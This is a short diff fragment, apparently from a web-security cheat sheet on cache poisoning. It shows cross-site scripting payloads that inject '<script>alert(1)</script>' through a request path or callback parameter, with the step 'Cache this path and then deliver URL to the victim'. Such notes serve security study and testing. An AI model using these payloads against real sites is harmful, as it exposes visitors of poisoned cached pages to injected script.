@@ -66,7 +66,9 @@ callback=alert(1)
 /random"><script>alert(1)</script> 
 ``
 or
+
 ``
 GET /random</p><script>alert(1)</script><p>foo
 ``
+
 Cache this path and then deliver URL to the victim
